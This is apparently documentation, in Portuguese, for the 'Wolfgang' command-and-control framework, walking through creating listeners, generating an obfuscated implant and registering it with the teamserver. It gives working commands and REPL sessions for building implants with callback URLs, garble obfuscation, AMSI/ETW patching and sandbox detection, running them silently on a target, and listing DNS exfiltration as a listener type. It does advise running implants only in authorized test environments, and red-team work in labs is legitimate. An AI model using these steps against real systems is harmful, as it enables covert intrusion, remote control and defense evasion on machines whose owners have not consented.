    Primeiro Implant¶

    Nesta etapa voce vai criar um listener, gerar um implant customizado, executa-lo em um alvo de teste e ver o agent aparecer no teamserver. Antes de prosseguir, certifique-se de que completou o Quickstart.

    Ambiente de Teste

    Execute implants apenas em ambientes autorizados. Use maquinas virtuais ou containers dedicados para testes.

    1. Criar um Listener HTTPS¶

    O listener e o endpoint que recebe conexoes dos implants. O config padrao ja cria um listener HTTPS na porta 443, mas voce pode criar listeners adicionais pelo client.

    Via REPL interativo¶

    wolfgang >> listeners create
Listener type (http/https/dns/ws): https
Bind address [0.0.0.0]: 0.0.0.0
Port: 443
Profile [default]: default
[+] Listener created: a1b2c3d4 (https on 0.0.0.0:443)

    Verificar listeners ativos¶

    wolfgang >> listeners
ID        TYPE   BIND      PORT  PROFILE  STATUS
a1b2c3d4  https  0.0.0.0   443   default  running

    Tipos de listener suportados¶

    Tipo Porta Tipica Uso
    https 443 Comunicacao padrao, mistura com trafego web legitimo
    http 80 Ambientes sem inspacao TLS (menos seguro)
    dns 53 Exfiltracao por DNS queries, atravessa a maioria dos firewalls
    ws 443/8080 WebSocket, persistent connection, menor latencia

    2. Gerar o Implant¶

    O Wolfgang compila implants sob demanda com configuracao embutida via -ldflags. Cada implant e unico -- as chaves, URLs e parametros sao inseridos em tempo de compilacao.

    Via CLI do servidor (direto)¶

    wolfgang-server generate \
  --os linux \
  --arch amd64 \
  --transport https \
  --callback https://10.0.0.1:443 \
  --sleep 5000 \
  --jitter 10 \
  --garble

    Saida:

    [+] Built: build/implant_linux_amd64 (2847523 bytes)
[+] OS: linux, Arch: amd64

    Via REPL do client¶

    wolfgang >> generate
Target OS (linux/windows/darwin): linux
Target arch (amd64/arm64/386) [amd64]: amd64
Transport (https/dns/ws) [https]: https
Output type (implant/stager) [implant]: implant
Callback URL(s) (comma-separated): https://10.0.0.1:443
Sleep interval (ms) [5000]: 5000
Jitter (0-100) [10]: 10
Format (exe/elf/macho) [exe]: elf
Use garble obfuscation? (y/N): y
Enable dynamic modules? (y/N): n
[*] Building implant... this may take a moment.
[+] Implant saved: implant_linux_amd64 (linux/amd64, 2847523 bytes)

    Parametros de generate¶

    Flag Default Descricao
    --os sistema atual OS alvo: linux, windows, darwin
    --arch arch atual Arquitetura: amd64, arm64, 386
    --transport https Transporte primario: https, dns, ws
    --callback (obrigatorio) URL(s) de callback -- primeira e primaria, demais sao fallback
    --sleep 5000 Intervalo de check-in em milissegundos
    --jitter 10 Variacao aleatoria no sleep (0-100%)
    --profile (nenhum) Nome do malleable profile
    --format auto pelo OS Formato de saida: exe, elf, macho
    --garble true Usar garble para ofuscar strings
    -o / --output build/implant_<os>_<arch> Caminho de saida do binario

    O que e embutido no implant¶

    O build system usa go build -ldflags -X para injetar configuracao diretamente no binario:

    • URL do callback (primario + fallbacks)
    • Tipo de transporte
    • Chave publica X25519 do servidor (key pinning)
    • Intervalos de sleep/jitter
    • Flags de evasao (AMSI, ETW, sandbox detection)
    • Flags de modulos dinamicos

    O binario resultante e estaticamente linkado (CGO_ENABLED=0) e strip de simbolos (-s -w).

    3. Executar no Alvo¶

    Transfira o implant para o alvo de teste e execute:

    # No alvo (Linux)
chmod +x implant_linux_amd64
./implant_linux_amd64

    Para Windows:

    # No alvo (Windows)
.\implant_windows_amd64.exe

    O implant nao produz saida visivel no terminal. Toda comunicacao acontece silenciosamente em background.

    Fases de inicializacao do implant¶

    O implant executa as seguintes fases ao iniciar:

    1. Auto-evasion: Verifica sandbox, patches AMSI/ETW se configurado
    2. Transport chain: Inicializa transportes configurados (primario + fallbacks)
    3. Registration: Key exchange ECDH com o servidor (detalhado abaixo)
    4. Module system: Registra modulos estaticos, inicializa loader dinamico
    5. Check-in loop: Entra no loop principal de check-in periodico

    4. Registro do Agent¶

    O processo de registro estabelece a sessao criptografada entre implant e servidor. Esse e o momento mais critico -- apos o registro, toda comunicacao subsequente usa criptografia autenticada.

    sequenceDiagram
    participant I as Implant
    participant S as Servidor

    Note over I: Gera keypair X25519 efemero
    I->>S: POST /register
    ephemeral_pub + sysinfo
    (hostname, OS, arch, user, IP)
    Note over S: Gera keypair X25519 efemero
    Note over S: Computa shared_secret = ECDH(server_priv, implant_pub)
    Note over S: session_key = HKDF-SHA256(shared_secret, agent_id)
    Note over S: Registra agent no SQLite
    S->>I: 200 OK
    agent_id + server_ephemeral_pub
    Note over I: Verifica server_pub contra key pinned no build
    Note over I: Computa shared_secret = ECDH(implant_priv, server_pub)
    Note over I: session_key = HKDF-SHA256(shared_secret, agent_id)
    Note over I: Descarta chave privada efemera (forward secrecy)
    Note over I,S: Sessao estabelecida com AES-256-GCM

    Detalhes do key exchange¶

    O Wolfgang usa X25519 ECDH (Elliptic Curve Diffie-Hellman) com chaves efemeras para estabelecer o segredo compartilhado:

    Passo 1 -- Geracao de chaves: O implant gera um par de chaves X25519 efemero (usado apenas para este registro).

    Passo 2 -- Registration request: O implant envia ao servidor:

    • Chave publica efemera (hex-encoded)
    • Metadados do sistema: hostname, OS, arch, username, IP
    • Configuracao: transport, sleep, jitter

    Passo 3 -- Key pinning: O implant verifica que a chave publica retornada pelo servidor corresponde a chave embutida em tempo de build (ServerPublicKey). Se nao corresponder, o registro e abortado. Isso previne ataques MITM.

    Passo 4 -- Derivacao de segredo: Ambos os lados computam:

    shared_secret = X25519(local_private, remote_public)
session_key   = HKDF-SHA256(shared_secret, info=agent_id)

    O agent_id e usado como info no HKDF, vinculando a chave de sessao a um agent especifico. Dois agents com o mesmo shared secret geram session keys diferentes.

    Passo 5 -- Forward secrecy: A chave privada efemera do implant sai de escopo apos a derivacao. Mesmo se a chave persistente do servidor for comprometida no futuro, sessoes passadas permanecem seguras.

    Envelope de comunicacao¶

    Apos o registro, toda comunicacao usa o formato envelope:

    +------------------+----------+--------+--------------+
| Agent ID (16B)   | Type (2B)| Seq (4B)| Payload Len  |
+------------------+----------+--------+--------------+
| AES-256-GCM encrypted payload ...                   |
+-----------------------------------------------------+
    Campo Tamanho Descricao
    Agent ID 16 bytes Identificador unico do agent
    Msg Type 2 bytes 1=Registration, 2=CheckIn, 3=TaskResponse, 4=TaskDispatch
    Sequence 4 bytes Numero de sequencia (nonce para AES-GCM)
    Payload Len 4 bytes Tamanho do payload criptografado
    Payload variavel Dados criptografados com AES-256-GCM usando a session key

    O header (26 bytes) e transmitido em cleartext. O payload e criptografado com a session key derivada no registro.

    Retentativas de registro¶

    Se o registro falhar (servidor indisponivel, erro de rede), o implant tenta novamente ate 10 vezes com backoff exponencial + jitter (delay base de 2 segundos + ate 3 segundos de jitter aleatorio). Apos esgotar as tentativas, o implant encerra silenciosamente (exit code 1).

    5. Verificar o Agent¶

    De volta ao client, o agent deve aparecer na lista:

    wolfgang >> agents
ID        HOSTNAME     OS     USER    LAST SEEN            TRANSPORT  STATUS
a1b2c3d4  target-vm    linux  root    2026-03-14 10:15:00  https      active

    Para ver detalhes completos:

    wolfgang >> use a1b2c3d4
wolfgang [a1b2c3d4] >> info
Agent ID:     a1b2c3d4-e5f6-7890-abcd-ef1234567890
Hostname:     target-vm
OS/Arch:      linux/amd64
Username:     root
Internal IP:  192.168.1.100
External IP:  203.0.113.50
Transport:    https
Sleep/Jitter: 5000ms / 10%
Last Seen:    2026-03-14 10:15:00
Status:       active

    Se o WebSocket estiver conectado, voce recebe uma notificacao em tempo real quando o agent registra:

    [EVENT] New agent registered: a1b2c3d4 (target-vm, linux/amd64)

    Troubleshooting¶

    Problema Solucao
    Agent nao aparece Verifique conectividade de rede entre alvo e listener. Firewall bloqueando porta?
    registration rejected: status 404 Listener nao esta rodando. Verifique listeners no client
    server public key mismatch O implant foi gerado com uma chave diferente. Regere o implant
    Agent aparece e some Check-in interval muito longo. Aguarde o proximo check-in (default: 5s)
    registration exhausted, exiting 10 tentativas falharam. Verifique URL de callback e acessibilidade
